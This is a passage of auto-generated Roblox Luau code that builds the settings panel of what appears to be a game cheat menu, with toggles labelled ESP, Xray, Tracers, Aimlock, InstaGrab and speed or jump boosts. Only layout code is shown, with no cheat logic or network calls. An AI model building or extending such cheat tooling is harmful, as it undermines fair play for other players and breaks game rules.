G2L["1c2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1c2"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["1c2"]["Position"] = UDim2.new(0.459, 0, -4.4, -2);
G2L["1c2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c2"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Circle
G2L["1c3"] = Instance.new("Frame", G2L["1c2"]);
G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["1c3"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["1c3"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["1c3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c3"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Circle.Mini
G2L["1c4"] = Instance.new("Frame", G2L["1c3"]);
G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1c4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1c4"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1c4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1c4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c4"]["Name"] = [[Mini]];
G2L["1c4"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Circle.Mini.UICorner
G2L["1c5"] = Instance.new("UICorner", G2L["1c4"]);
G2L["1c5"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Circle.UICorner
G2L["1c6"] = Instance.new("UICorner", G2L["1c3"]);
G2L["1c6"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Button
G2L["1c7"] = Instance.new("TextButton", G2L["1c2"]);
G2L["1c7"]["BorderSizePixel"] = 0;
G2L["1c7"]["TextSize"] = 14;
G2L["1c7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1c7"]["BackgroundTransparency"] = 1;
G2L["1c7"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["1c7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c7"]["Text"] = [[]];
G2L["1c7"]["Name"] = [[Button]];
G2L["1c7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Button.LocalScript
G2L["1c8"] = Instance.new("LocalScript", G2L["1c7"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.UIPadding
G2L["1c9"] = Instance.new("UIPadding", G2L["1c2"]);
G2L["1c9"]["PaddingTop"] = UDim.new(0, 4);
G2L["1c9"]["PaddingRight"] = UDim.new(0, 4);
G2L["1c9"]["PaddingLeft"] = UDim.new(0, 4);
G2L["1c9"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.UICorner
G2L["1ca"] = Instance.new("UICorner", G2L["1c2"]);
G2L["1ca"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.UIPadding
G2L["1cb"] = Instance.new("UIPadding", G2L["1bb"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBox
G2L["1cc"] = Instance.new("Frame", G2L["1bb"]);
G2L["1cc"]["BorderSizePixel"] = 0;
G2L["1cc"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1cc"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1cc"]["Position"] = UDim2.new(0.01, 15, 0.18217, -5);
G2L["1cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cc"]["Name"] = [[EspBox]];
G2L["1cc"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBox.UICorner
G2L["1cd"] = Instance.new("UICorner", G2L["1cc"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBox.TextLabel
G2L["1ce"] = Instance.new("TextLabel", G2L["1cc"]);
G2L["1ce"]["TextWrapped"] = true;
G2L["1ce"]["BorderSizePixel"] = 0;
G2L["1ce"]["TextSize"] = 14;
G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ce"]["BackgroundTransparency"] = 1;
G2L["1ce"]["Size"] = UDim2.new(0, 48, 0, 16);
G2L["1ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ce"]["Text"] = [[EspBox]];
G2L["1ce"]["Position"] = UDim2.new(0.087, 0, 0.251, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBox.UIStroke
G2L["1cf"] = Instance.new("UIStroke", G2L["1cc"]);
G2L["1cf"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Noflymeduse
G2L["1d0"] = Instance.new("Frame", G2L["1bb"]);
G2L["1d0"]["BorderSizePixel"] = 0;
G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1d0"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1d0"]["Position"] = UDim2.new(0.01, 15, 0.34742, -5);
G2L["1d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d0"]["Name"] = [[Noflymeduse]];
G2L["1d0"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Noflymeduse.UICorner
G2L["1d1"] = Instance.new("UICorner", G2L["1d0"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Noflymeduse.TextLabel
G2L["1d2"] = Instance.new("TextLabel", G2L["1d0"]);
G2L["1d2"]["TextWrapped"] = true;
G2L["1d2"]["BorderSizePixel"] = 0;
G2L["1d2"]["TextSize"] = 14;
G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d2"]["BackgroundTransparency"] = 1;
G2L["1d2"]["Size"] = UDim2.new(0, 40, 0, 16);
G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d2"]["Text"] = [[Xray]];
G2L["1d2"]["Position"] = UDim2.new(0.1, -9, 0.271, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Noflymeduse.UIStroke
G2L["1d3"] = Instance.new("UIStroke", G2L["1d0"]);
G2L["1d3"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Ping
G2L["1d4"] = Instance.new("Frame", G2L["1bb"]);
G2L["1d4"]["BorderSizePixel"] = 0;
G2L["1d4"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1d4"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1d4"]["Position"] = UDim2.new(0.01, 15, 0.42842, -5);
G2L["1d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d4"]["Name"] = [[Ping]];
G2L["1d4"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Ping.UICorner
G2L["1d5"] = Instance.new("UICorner", G2L["1d4"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Ping.TextLabel
G2L["1d6"] = Instance.new("TextLabel", G2L["1d4"]);
G2L["1d6"]["TextWrapped"] = true;
G2L["1d6"]["BorderSizePixel"] = 0;
G2L["1d6"]["TextSize"] = 14;
G2L["1d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1d6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d6"]["BackgroundTransparency"] = 1;
G2L["1d6"]["Size"] = UDim2.new(0, 66, 0, 16);
G2L["1d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d6"]["Text"] = [[ShowPing]];
G2L["1d6"]["Position"] = UDim2.new(0.08769, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Ping.UIStroke
G2L["1d7"] = Instance.new("UIStroke", G2L["1d4"]);
G2L["1d7"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AutoPush
G2L["1d8"] = Instance.new("Frame", G2L["1bb"]);
G2L["1d8"]["BorderSizePixel"] = 0;
G2L["1d8"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1d8"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1d8"]["Position"] = UDim2.new(0.01, 15, 0.508, -5);
G2L["1d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d8"]["Name"] = [[AutoPush]];
G2L["1d8"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AutoPush.UICorner
G2L["1d9"] = Instance.new("UICorner", G2L["1d8"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AutoPush.TextLabel
G2L["1da"] = Instance.new("TextLabel", G2L["1d8"]);
G2L["1da"]["TextWrapped"] = true;
G2L["1da"]["BorderSizePixel"] = 0;
G2L["1da"]["TextSize"] = 14;
G2L["1da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1da"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1da"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1da"]["BackgroundTransparency"] = 1;
G2L["1da"]["Size"] = UDim2.new(0, 64, 0, 16);
G2L["1da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1da"]["Text"] = [[ShowFps]];
G2L["1da"]["Position"] = UDim2.new(0.08769, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AutoPush.UIStroke
G2L["1db"] = Instance.new("UIStroke", G2L["1d8"]);
G2L["1db"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Aimlock
G2L["1dc"] = Instance.new("Frame", G2L["1bb"]);
G2L["1dc"]["BorderSizePixel"] = 0;
G2L["1dc"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1dc"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1dc"]["Position"] = UDim2.new(0.01, 15, 0.58941, -5);
G2L["1dc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1dc"]["Name"] = [[Aimlock]];
G2L["1dc"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Aimlock.UICorner
G2L["1dd"] = Instance.new("UICorner", G2L["1dc"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Aimlock.TextLabel
G2L["1de"] = Instance.new("TextLabel", G2L["1dc"]);
G2L["1de"]["TextWrapped"] = true;
G2L["1de"]["BorderSizePixel"] = 0;
G2L["1de"]["TextSize"] = 14;
G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1de"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1de"]["BackgroundTransparency"] = 1;
G2L["1de"]["Size"] = UDim2.new(0, 66, 0, 16);
G2L["1de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1de"]["Text"] = [[FpsBoost]];
G2L["1de"]["Position"] = UDim2.new(0.08769, -5, 0.27, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Aimlock.UIStroke
G2L["1df"] = Instance.new("UIStroke", G2L["1dc"]);
G2L["1df"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Tracers
G2L["1e0"] = Instance.new("Frame", G2L["1bb"]);
G2L["1e0"]["BorderSizePixel"] = 0;
G2L["1e0"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1e0"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1e0"]["Position"] = UDim2.new(0.01, 15, 0.67157, -5);
G2L["1e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e0"]["Name"] = [[Tracers]];
G2L["1e0"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Tracers.UICorner
G2L["1e1"] = Instance.new("UICorner", G2L["1e0"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Tracers.TextLabel
G2L["1e2"] = Instance.new("TextLabel", G2L["1e0"]);
G2L["1e2"]["TextWrapped"] = true;
G2L["1e2"]["BorderSizePixel"] = 0;
G2L["1e2"]["TextSize"] = 14;
G2L["1e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1e2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e2"]["BackgroundTransparency"] = 1;
G2L["1e2"]["Size"] = UDim2.new(0, 52, 0, 17);
G2L["1e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e2"]["Text"] = [[Tracers]];
G2L["1e2"]["Position"] = UDim2.new(0.08769, -5, 0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Tracers.UIStroke
G2L["1e3"] = Instance.new("UIStroke", G2L["1e0"]);
G2L["1e3"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrab
G2L["1e4"] = Instance.new("Frame", G2L["1bb"]);
G2L["1e4"]["Visible"] = false;
G2L["1e4"]["BorderSizePixel"] = 0;
G2L["1e4"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1e4"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1e4"]["Position"] = UDim2.new(0.01, 15, 0.75248, -5);
G2L["1e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e4"]["Name"] = [[InstaGrab]];
G2L["1e4"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrab.UICorner
G2L["1e5"] = Instance.new("UICorner", G2L["1e4"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrab.TextLabel
G2L["1e6"] = Instance.new("TextLabel", G2L["1e4"]);
G2L["1e6"]["TextWrapped"] = true;
G2L["1e6"]["BorderSizePixel"] = 0;
G2L["1e6"]["TextSize"] = 14;
G2L["1e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e6"]["BackgroundTransparency"] = 1;
G2L["1e6"]["Size"] = UDim2.new(0, 62, 0, 17);
G2L["1e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e6"]["Text"] = [[InstaGrab]];
G2L["1e6"]["Position"] = UDim2.new(0.1, -5, 0.24, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrab.UIStroke
G2L["1e7"] = Instance.new("UIStroke", G2L["1e4"]);
G2L["1e7"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Broken
G2L["1e8"] = Instance.new("Frame", G2L["1bb"]);
G2L["1e8"]["Visible"] = false;
G2L["1e8"]["BorderSizePixel"] = 0;
G2L["1e8"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1e8"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1e8"]["Position"] = UDim2.new(0.01, 15, 0.913, -5);
G2L["1e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e8"]["Name"] = [[Broken]];
G2L["1e8"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Broken.UICorner
G2L["1e9"] = Instance.new("UICorner", G2L["1e8"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Broken.TextLabel
G2L["1ea"] = Instance.new("TextLabel", G2L["1e8"]);
G2L["1ea"]["TextWrapped"] = true;
G2L["1ea"]["BorderSizePixel"] = 0;
G2L["1ea"]["TextSize"] = 14;
G2L["1ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ea"]["BackgroundTransparency"] = 1;
G2L["1ea"]["Size"] = UDim2.new(0, 49, 0, 17);
G2L["1ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ea"]["Text"] = [[Broken]];
G2L["1ea"]["Position"] = UDim2.new(0.1, -5, 0.21, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Broken.UIStroke
G2L["1eb"] = Instance.new("UIStroke", G2L["1e8"]);
G2L["1eb"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoost
G2L["1ec"] = Instance.new("Frame", G2L["1bb"]);
G2L["1ec"]["BorderSizePixel"] = 0;
G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1ec"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1ec"]["Position"] = UDim2.new(0.01, 15, 0.1, -5);
G2L["1ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ec"]["Name"] = [[JumpBoost]];
G2L["1ec"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoost.UICorner
G2L["1ed"] = Instance.new("UICorner", G2L["1ec"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoost.TextLabel
G2L["1ee"] = Instance.new("TextLabel", G2L["1ec"]);
G2L["1ee"]["BorderSizePixel"] = 0;
G2L["1ee"]["TextSize"] = 14;
G2L["1ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ee"]["BackgroundTransparency"] = 1;
G2L["1ee"]["Size"] = UDim2.new(0, 105, 0, 16);
G2L["1ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ee"]["Text"] = [[EspTimeBase]];
G2L["1ee"]["Position"] = UDim2.new(0.05234, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoost.UIStroke
G2L["1ef"] = Instance.new("UIStroke", G2L["1ec"]);
G2L["1ef"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayer
G2L["1f0"] = Instance.new("Frame", G2L["1bb"]);
G2L["1f0"]["BorderSizePixel"] = 0;
G2L["1f0"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1f0"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1f0"]["Position"] = UDim2.new(0.01, 15, 0.26618, -5);
G2L["1f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f0"]["Name"] = [[EspPlayer]];
G2L["1f0"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayer.UICorner
G2L["1f1"] = Instance.new("UICorner", G2L["1f0"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayer.TextLabel
G2L["1f2"] = Instance.new("TextLabel", G2L["1f0"]);
G2L["1f2"]["TextWrapped"] = true;
G2L["1f2"]["BorderSizePixel"] = 0;
G2L["1f2"]["TextSize"] = 14;
G2L["1f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f2"]["BackgroundTransparency"] = 1;
G2L["1f2"]["Size"] = UDim2.new(0, 69, 0, 16);
G2L["1f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f2"]["Text"] = [[EspPlayers]];
G2L["1f2"]["Position"] = UDim2.new(0.1, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayer.UIStroke
G2L["1f3"] = Instance.new("UIStroke", G2L["1f0"]);
G2L["1f3"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Cloner
G2L["1f4"] = Instance.new("Frame", G2L["1bb"]);
G2L["1f4"]["Visible"] = false;
G2L["1f4"]["BorderSizePixel"] = 0;
G2L["1f4"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1f4"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["1f4"]["Position"] = UDim2.new(0.01, 15, 0.83137, -5);
G2L["1f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f4"]["Name"] = [[Cloner]];
G2L["1f4"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Cloner.UICorner
G2L["1f5"] = Instance.new("UICorner", G2L["1f4"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Cloner.TextLabel
G2L["1f6"] = Instance.new("TextLabel", G2L["1f4"]);
G2L["1f6"]["TextWrapped"] = true;
G2L["1f6"]["BorderSizePixel"] = 0;
G2L["1f6"]["TextSize"] = 14;
G2L["1f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f6"]["BackgroundTransparency"] = 1;
G2L["1f6"]["Size"] = UDim2.new(0, 42, 0, 17);
G2L["1f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f6"]["Text"] = [[Cloner]];
G2L["1f6"]["Position"] = UDim2.new(0.1, -5, 0.23999, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Cloner.UIStroke
G2L["1f7"] = Instance.new("UIStroke", G2L["1f4"]);
G2L["1f7"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle
G2L["1f8"] = Instance.new("Frame", G2L["1bb"]);
G2L["1f8"]["BorderSizePixel"] = 0;
G2L["1f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f8"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["1f8"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["1f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f8"]["Name"] = [[SpeedBoostToggle]];
G2L["1f8"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Main Handler
G2L["1f9"] = Instance.new("LocalScript", G2L["1f8"]);
G2L["1f9"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder
G2L["1fa"] = Instance.new("Frame", G2L["1f8"]);
G2L["1fa"]["ZIndex"] = 2;
G2L["1fa"]["BorderSizePixel"] = 0;
G2L["1fa"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1fa"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1fa"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["1fa"]["Position"] = UDim2.new(0.459, 0, -3.8, -2);
G2L["1fa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1fa"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Circle
G2L["1fb"] = Instance.new("Frame", G2L["1fa"]);
G2L["1fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fb"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["1fb"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["1fb"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["1fb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1fb"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini
G2L["1fc"] = Instance.new("Frame", G2L["1fb"]);
G2L["1fc"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["1fc"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1fc"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1fc"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["1fc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1fc"]["Name"] = [[Mini]];
G2L["1fc"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini.UICorner
G2L["1fd"] = Instance.new("UICorner", G2L["1fc"]);
G2L["1fd"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Circle.UICorner
G2L["1fe"] = Instance.new("UICorner", G2L["1fb"]);
G2L["1fe"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Button
G2L["1ff"] = Instance.new("TextButton", G2L["1fa"]);
G2L["1ff"]["BorderSizePixel"] = 0;
G2L["1ff"]["TextSize"] = 14;
G2L["1ff"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
